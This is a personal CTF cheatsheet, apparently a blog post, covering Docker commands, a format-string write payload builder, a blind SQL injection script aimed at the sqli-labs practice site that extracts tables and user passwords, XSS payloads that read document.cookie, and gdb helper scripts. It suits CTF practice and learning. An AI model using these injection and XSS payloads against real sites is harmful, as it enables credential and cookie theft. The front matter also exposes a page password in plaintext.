---
title: CTF Cheatsheet
date: 1970-01-01 00:00:00
tags: ctf
password: assassinqkeepshumble
abstract: Sorry, the article is encrypted.
message: Need password...
wrong_pass_message: Wrong password.
wrong_hash_message: Wrong hash.
---

Some tips.

<!-- more -->

# Docker

通过 Dockerfile 打包镜像（`-t`：镜像名字及标签）：

```bash
docker build -t IMAGE_NAME .
```

把容器打包成镜像：

```bash
docker commit CONTAINER_ID DOCKER_HUB_USERNAME/REPO_NAME[:TAG]
```

上传镜像到 Docker Hub：

```bash
docker push DOCKER_HUB_USERNAME/REPO_NAME[:TAG]
```

启动 Docker 容器（`-p`：映射端口；`-it`：和启动的容器进行交互；`--rm`：退出容器后自动删除；`-e`：覆盖容器内部的环境变量；`-v`：挂载本地目录到容器中）：

````bash
# IP=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
docker run -p 23946:23946 -it --rm --privileged -e DISPLAY="$IP:0" -v "$PWD:/root/tmp" DOCKER_HUB_USERNAME/REPO_NAME[:TAG] /bin/zsh
```# Format String

```python
def fmt(offset, addr, val):
	payload = ''.join(p32(addr + i) for i in range(4))
	printed = len(payload)
	fmt1 = '%{}c'
	fmt2 = '%{}$hhn'
	for i in range(4):
		byte = (val >> (i * 8)) & 0xff
		addition = (byte - printed + 256) % 256
		if addition > 0:
			payload += fmt1.format(str(addition))
		payload += fmt2.format(str(offset + i))
		printed += addition
	return payload
````

# SQL Injection

```python
import requests

url = "" # "http://127.0.0.1/sqli-labs-master/less-5/index.php?id="
payload = "abcdefghijklmnopqrstuvwxyz1234567890!@#{}_-=+[]&();"

def get_databse():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "" # "1' and substr(database(),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Database: ", res)

def get_tables():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "" # "1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Table names: ", res)

def get_columns():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "" # "1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Column names: ", res)

def get_flag():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "" # "1' and substr((select group_concat(password separator ';') from security.users),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Flag: ", res)
```

# XSS

```js
<script>alert(document.cookie);</script>
<ScRipT>alert(document.cookie);</ScRipT>
<img src=xss onerror=alert(document.cookie)>
<var onmouseover="prompt(1)">On Mouse Over</var>
<video src=1 onerror=alert(document.cookie)>
...
```

# GDB Script

gdb 自动 attach 到指定程序：

```python
import subprocess
import re
import gdb

# https://www.youtube.com/watch?v=jEHgm7S58N8
class AutoAttach(gdb.Command):
	def __init__(self):
		super(AutoAttach, self).__init__('at', gdb.COMMAND_USER)

	def invoke(self, arg, from_tty):
		try:
			gdb.execute('info proc', True, True)
			gdb.execute('kill', True, True)
		except gdb.error:
			pass

		if arg:
			fn = arg
		else:
			fn = re.findall('Symbols from "(.*)"', gdb.execute('info files', True, True))[0]

		try:
			ps = list(map(int, subprocess.check_output(['/bin/pidof', fn]).split()))[0]
			gdb.execute('attach %d' % ps)
			gdb.execute('c')
		except subprocess.CalledProcessError:
			print 'No process to attach on.'

AutoAttach()
```

查看 vmmap：

```python
import subprocess
import re
import gdb

class ShowVMMap(gdb.Command):
	def __init__(self):
		super(ShowVMMap, self).__init__('vmmap', gdb.COMMAND_USER)

	def invoke(self, arg, from_tty):
		try:
			with open('/proc/%d/maps' % gdb.selected_inferior().pid) as fp:
				proc_map = fp.read()
				proc_map = self.parse_map(proc_map)
				self.print_map(proc_map)
		except Exception as e:
			print 'Program is not started.'

	# https://blog.lse.epita.fr/articles/10-pythongdb-tutorial-for-reverse-engineering---part-.html
	def parse_map(self, proc_map):
		result = []
		for line in proc_map.split('\n'):
			if not line:
				continue
			l = line.split()
			if len(l) == 5:
				memrange, perms, offset, device, inode = l
				fpath = ''
			else:
				memrange, perms, offset, device, inode, fpath = l
			start, end = memrange.split('-')
			result.append({
				'start': int(start, 16),
				'end': int(end, 16),
				'perms': perms,
				'offset': int(offset, 16),
				'fpath': fpath
			})
		return result

	def hex_int(self, num):
		return hex(num).replace('L', '')

	def print_map(self, proc_map):
		print ' ' + 'Start Address'.ljust(18, ' ') + ' ' + 'End Address'.ljust(18, ' ') + ' ' + 'Perm\t' + 'Offset'.ljust(10, ' ') + ' ' + 'Name'
		for line in proc_map:
			print ' ' + self.hex_int(line['start']).ljust(18, ' ') + \
				' ' + self.hex_int(line['end']).ljust(18, ' ') + \
				' ' + line['perms'] + \
				'\t' + self.hex_int(line['offset']).ljust(10, ' ') + \
				' ' + line['fpath']

ShowVMMap()
```
